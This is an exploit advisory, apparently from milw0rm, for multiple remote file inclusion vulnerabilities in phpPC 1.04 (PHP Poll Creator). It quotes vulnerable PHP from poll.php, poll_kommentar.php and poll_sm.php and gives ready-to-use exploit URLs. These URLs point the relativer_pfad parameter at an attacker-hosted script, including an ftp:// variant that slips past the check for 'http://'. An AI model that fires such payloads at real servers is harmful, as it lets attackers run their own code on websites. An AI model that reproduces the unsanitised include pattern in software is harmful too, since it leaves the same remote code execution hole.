<html><head><title>phpPC <= 1.04 Multiple Remote File Inclusion Vulnerabilities</title></head><pre>phpPC 1.04 Multiples Remote File Inclusion

Script        : PHP Poll Creator
Version       : 1.04
Vendor URL    : http://www.phppc.de
Impact        : Remote File Inclusion
Discovered by : iss4m
Contact       : iss4m.1@gmail.com


Vulnerable code in poll.php
--------------------------------

&lt;?php
if ($is_phppc_included != 1) {
    include &quot;config.inc.php&quot;;
    $file = &quot;lib/functions.inc.php&quot;;
    include $relativer_pfad.$file;
    include ($relativer_pfad . &quot;layout_top.inc.php&quot;);
    $is_phppc_included = 1;
}else include $relativer_pfad . &quot;lib/get_config.inc.php&quot;; #&lt;== !!!!

Exploit :
**********

http://localhost/phppc/poll.php?is_phppc_included=1&amp;relativer_pfad=http://attacker/inject.txt?


Vulnerable code in poll.php poll_kommentar.php
-----------------------------------------------

&lt;?php

if ($is_phppc_included != 1) {
    include &quot;config.inc.php&quot;;
    include ($relativer_pfad . &quot;lib/functions.inc.php&quot;);
}
$com = &quot;phppc_kommentar&quot;;
$cookie = $cookie_name.$com.$poll_id;
$cookie_ueberwachung = ${$cookie};
if($action=='new_com') {
    if ($cookie_ueberwachung==&quot;flood&quot;) {
        $must_not_create_com = 1;
    }else {
        $zeit = time() + 30;
        SetCookie(&quot;$cookie_name$com$poll_id&quot;,&quot;flood&quot;,&quot;$zeit&quot;,&quot;/&quot;);        
    }
}
if ($is_phppc_included != 1) {
    include &quot;layout_top.inc.php&quot;;
    $is_phppc_included = 1;
}
include $relativer_pfad . &quot;poll_titel_kat.inc.php&quot;;  # Here !!!!!!!!


http://localhost/phppc/poll_kommentar.php?is_phppc_included=1&amp;relativer_pfad=http://attacker/inject.txt ?



Vulnerable code in poll_sm.php
---------------------------------

if(substr_count($relativer_pfad,&quot;http://&quot;) &gt;= 1 OR substr_count($relativer_pfad,&quot;../&quot;) &gt;= 1) $relativer_pfad = &quot;&quot;;

if ($is_phppc_included != 1) {
    $file = &quot;lib/functions.inc.php&quot;;
    include $relativer_pfad.$file;
}
include ($relativer_pfad . &quot;layout_top_sm.inc.php&quot;);


the script check only if $relativer_pfad contain &quot;http://&quot; but we can include remote file using ftp://

Exploit :
**********

http://localhost/phppc/poll_sm.php?is_phppc_included=1&amp;relativer_pfad=ftp://user:pass@ftp.attacker.ltd/script.txt ?

# milw0rm.com [2006-11-21]</pre></html>